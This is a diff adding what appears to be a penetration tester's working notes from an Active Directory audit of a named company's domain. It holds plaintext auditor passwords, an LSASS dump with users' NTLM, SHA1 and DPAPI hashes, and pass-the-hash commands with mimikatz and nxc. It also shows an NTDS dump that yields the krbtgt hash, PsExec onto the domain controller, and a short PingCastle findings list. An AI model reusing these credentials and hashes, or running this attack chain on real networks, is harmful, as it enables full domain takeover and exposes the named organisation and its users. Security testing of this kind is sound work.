@@ -1,0 +1,84 @@
+pmp-va-p1.neogames.com
+
+local user auditor1
+local pass X2di40t2oP3!
+dom user auditor2
+dom pass i40t2F2doP3!
+pmp user auditor1
+pmp pass i40t2F2doP3!
+
+
+runas /netonly /user:neo.corp.neogames-tech.com\auditor2 cmd.exe
+
+
+C:\Windows\system32>nltest /dclist:neo.corp.neogames-tech.com
+Get list of DCs in domain 'neo.corp.neogames-tech.com' from '\\VA-P1-DC1.neo.corp.neogames-tech.com'.
+    VA-P1-DC1.neo.corp.neogames-tech.com [PDC]  [DS] Site: VA-P1
+    VA-P1-DC2.neo.corp.neogames-tech.com        [DS] Site: VA-P1		--->	10.61.55.102
+    VA-P2-DC1.neo.corp.neogames-tech.com        [DS] Site: VA-P2
+    VA-P2-DC2.neo.corp.neogames-tech.com        [DS] Site: VA-P2
+The command completed successfully
+
+certutil - no certificate authority
+
+invoke-B -CollectionMethods All -Domain neo.corp.neogames-tech.com -Threads 50 -OutputDirectory "C:\Users\auditor1\Desktop"
+
+kerberoast /simple /spn:"kadmin/changepw" /user:auditor2 /domain:neo.corp.neogames-tech.com /nowrap - not crackable
+
+nltest /dclist:neo.corp.neogames-tech.com
+
+------------------------------------ LSASS DUMP ------------------------------------
+
+[00000003] Primary
+         * Username : ChenMa
+         * Domain   : NEO
+         * NTLM     : 6c69a3d8680699891ae6cd473eb95e9b
+         * SHA1     : b42ec79c06f507994d54630fc4c2abd081a6ad93
+         * DPAPI    : 41cf5f429149ca244dc9cb19e08a4554
+
+
+DA ---> [00000003] Primary
+         * Username : IT_Ops
+         * Domain   : NEO
+         * NTLM     : ec1754265f5ed3497c62f201ea1222c3
+         * SHA1     : a583a29e410e89f834b7e4d234061e30d1d29ca8
+         * DPAPI    : 9ced3f5a68123ca3d54d8d0d6a2ee56a
+
+PTH ---> .\nxc.exe ldap VA-P1-DC1.neo.corp.neogames-tech.com -u IT_OPS -H ec1754265f5ed3497c62f201ea1222c3
+
+mimikatz # sekurlsa::pth /user:IT_OPS /domain:neo.corp.neogames-tech.com /ntlm:ec1754265f5ed3497c62f201ea1222c3 /run:powershell.exe
+
+.\nxc.exe smb VA-P1-DC1.neo.corp.neogames-tech.com -u IT_OPS -H ec1754265f5ed3497c62f201ea1222c3 --ntds drsuapi --user krbtgt
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3041231dc5b75d1b9aef5d393a6110dc:::
+
+ .\PsExec64.exe \\VA-P1-DC1.neo.corp.neogames-tech.com -i cmd
+
+------------------------------------Cleanup------------------------------------
+auditor2 in domain admins 
+
+
+
+
+------------------------------------Findings------------------------------------
+### No screenshot ###
+
+
+### screenshot taken ###
+domain admin login to endpoints 
+ldap signing
+
+(pingcastle report) Objects with password never expires - 192 users (Role_IT - password never expires Domain admin user )
+ms-DS-MachineAccountQuota - 10 
+(pingcastle report) Objects with empty password - 33 users
+(pingcastle report) Last change of the kerberos password: 3076 days ago - recommended 90 days 
+
+
+### TDL ###
+export:
+	screenshots
+	pingcastle
+	timeline	
+
+
+
+(pingcastle report) Inactive objects (6 months or more) - 89 users
